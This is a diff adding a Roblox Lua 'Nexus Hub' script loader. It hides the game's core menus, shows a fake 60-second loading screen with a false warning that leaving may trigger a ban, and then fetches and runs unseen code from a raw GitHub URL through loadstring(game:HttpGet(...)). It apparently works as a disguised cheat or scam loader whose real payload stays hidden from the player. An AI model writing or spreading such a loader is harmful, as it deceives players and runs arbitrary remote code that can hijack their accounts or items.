@@ -1,0 +1,188 @@
+-- NEXUS HUB GUI WITH TIMER, FADE, AND UPDATED SCRIPT LOADER
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+
+-- DISABLE CORE GUI
+for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+	StarterGui:SetCoreGuiEnabled(guiType, false)
+end
+
+-- FIRST SCREEN GUI
+local screenGui1 = Instance.new("ScreenGui", playerGui)
+screenGui1.Name = "NexusHubGUI"
+screenGui1.DisplayOrder = 9999
+screenGui1.IgnoreGuiInset = true
+screenGui1.ResetOnSpawn = false
+
+local bg1 = Instance.new("Frame", screenGui1)
+bg1.Size = UDim2.fromScale(1, 1)
+bg1.BackgroundColor3 = Color3.fromRGB(30, 0, 60)
+
+local gradient = Instance.new("UIGradient", bg1)
+gradient.Rotation = 45
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 0, 130)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 0, 60))
+}
+
+for i = 1, 20 do
+	local line = Instance.new("Frame", bg1)
+	line.Size = UDim2.new(0.002, 0, 1, 0)
+	line.Position = UDim2.new(i * 0.05, 0, 0, 0)
+	line.BackgroundTransparency = 0.9
+	line.BackgroundColor3 = Color3.new(1, 1, 1)
+	line.BorderSizePixel = 0
+end
+
+for i = 1, 20 do
+	local line = Instance.new("Frame", bg1)
+	line.Size = UDim2.new(1, 0, 0.002, 0)
+	line.Position = UDim2.new(0, 0, i * 0.05, 0)
+	line.BackgroundTransparency = 0.9
+	line.BackgroundColor3 = Color3.new(1, 1, 1)
+	line.BorderSizePixel = 0
+end
+
+for i = 1, 25 do
+	local star = Instance.new("Frame", bg1)
+	star.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
+	star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	star.BackgroundColor3 = Color3.new(1, 1, 1)
+	star.BackgroundTransparency = 0.8
+	star.BorderSizePixel = 0
+	TweenService:Create(star, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+		BackgroundTransparency = 0.4
+	}):Play()
+end
+
+local welcome = Instance.new("TextLabel", bg1)
+welcome.Text = "WELCOME TO NEXUS HUB!"
+welcome.Size = UDim2.new(0.7, 0, 0.15, 0)
+welcome.Position = UDim2.new(0.15, 0, 0.42, 0)
+welcome.BackgroundTransparency = 1
+welcome.TextColor3 = Color3.fromRGB(170, 0, 255)
+welcome.TextScaled = true
+welcome.Font = Enum.Font.GothamBlack
+
+local startBtn = Instance.new("TextButton", bg1)
+startBtn.Text = "Start"
+startBtn.Size = UDim2.new(0.3, 0, 0.08, 0)
+startBtn.Position = UDim2.new(0.35, 0, 0.58, 0)
+startBtn.Font = Enum.Font.GothamBold
+startBtn.TextScaled = true
+startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+startBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0.3, 0)
+
+-- SECOND SCREEN GUI
+local screenGui2 = Instance.new("ScreenGui", playerGui)
+screenGui2.Name = "NexusHub_TimerGUI"
+screenGui2.DisplayOrder = 9998
+screenGui2.IgnoreGuiInset = true
+screenGui2.ResetOnSpawn = false
+screenGui2.Enabled = false
+
+local bg2 = Instance.new("Frame", screenGui2)
+bg2.Size = UDim2.fromScale(1, 1)
+bg2.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+
+local title2 = Instance.new("TextLabel", bg2)
+title2.Size = UDim2.new(1, 0, 0.1, 0)
+title2.Position = UDim2.new(0, 0, 0.35, 0)
+title2.Text = "NEXUS-HUB SCRIPT LOADIN☘️"
+title2.TextColor3 = Color3.fromRGB(170, 0, 255)
+title2.BackgroundTransparency = 1
+title2.Font = Enum.Font.GothamBold
+title2.TextScaled = true
+
+local barBg = Instance.new("Frame", bg2)
+barBg.Size = UDim2.new(0.6, 0, 0.05, 0)
+barBg.Position = UDim2.new(0.2, 0, 0.5, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
+barBg.BorderSizePixel = 0
+Instance.new("UICorner", barBg).CornerRadius = UDim.new(0.3, 0)
+
+local bar = Instance.new("Frame", barBg)
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+bar.BorderSizePixel = 0
+Instance.new("UICorner", bar).CornerRadius = UDim.new(0.3, 0)
+
+local loadText = Instance.new("TextLabel", barBg)
+loadText.Size = UDim2.fromScale(1, 1)
+loadText.BackgroundTransparency = 1
+loadText.TextColor3 = Color3.new(1, 1, 1)
+loadText.Font = Enum.Font.GothamBold
+loadText.TextScaled = true
+loadText.Text = "SCRIPT IS LOADING… 60s ☘️"
+loadText.ZIndex = 2
+
+local warning = Instance.new("TextLabel", bg2)
+warning.Size = UDim2.new(1, 0, 0.08, 0)
+warning.Position = UDim2.new(0, 0, 0.58, 0)
+warning.Text = "IMPORTANT: Leaving now may trigger a ban due to anti-cheat interference. Please stay for a moment."
+warning.BackgroundTransparency = 1
+warning.TextColor3 = Color3.fromRGB(255, 50, 50)
+warning.TextScaled = true
+warning.Font = Enum.Font.GothamBold
+
+local actBtn = Instance.new("TextButton", bg2)
+actBtn.Size = UDim2.new(0.3, 0, 0.08, 0)
+actBtn.Position = UDim2.new(0.35, 0, 0.7, 0)
+actBtn.Text = "Activate Script"
+actBtn.Visible = false
+actBtn.TextScaled = true
+actBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+actBtn.TextColor3 = Color3.new(0, 0, 0)
+actBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", actBtn).CornerRadius = UDim.new(0.3, 0)
+
+-- PROGRESS BAR FUNCTION (1-MIN TIMER)
+local function startProgressBar(duration)
+	local t0 = tick()
+	local tEnd = t0 + duration
+
+	while tick() < tEnd do
+		local elapsed = tick() - t0
+		local remaining = math.max(0, math.ceil(duration - elapsed))
+		local percent = math.clamp(elapsed / duration, 0, 1)
+
+		bar.Size = UDim2.new(percent, 0, 1, 0)
+		loadText.Text = "SCRIPT IS LOADING… " .. remaining .. "s ☘️"
+		wait(0.1)
+	end
+
+	bar.Size = UDim2.new(1, 0, 1, 0)
+	loadText.Text = "SCRIPT IS LOADING… 0s ☘️"
+	actBtn.Visible = true
+end
+
+-- START BUTTON CLICK
+startBtn.MouseButton1Click:Connect(function()
+	screenGui1.Enabled = false
+	screenGui2.Enabled = true
+	startProgressBar(60)
+end)
+
+-- ACTIVATE SCRIPT BUTTON CLICK
+actBtn.MouseButton1Click:Connect(function()
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NEXUS-MA1N/Iniyot/refs/heads/main/Nimadam"))()
+	end)
+	if not success then warn(err) end
+
+	for _, el in pairs(screenGui2:GetDescendants()) do
+		if el:IsA("TextLabel") or el:IsA("TextButton") or el:IsA("Frame") then
+			local props = {BackgroundTransparency = 1}
+			if el:IsA("TextLabel") or el:IsA("TextButton") then
+				props.TextTransparency = 1
+			end
+			TweenService:Create(el, TweenInfo.new(1, Enum.EasingStyle.Sine), props):Play()
+		end
+	end
+	wait(1.1)
+	screenGui2:Destroy()
+end)
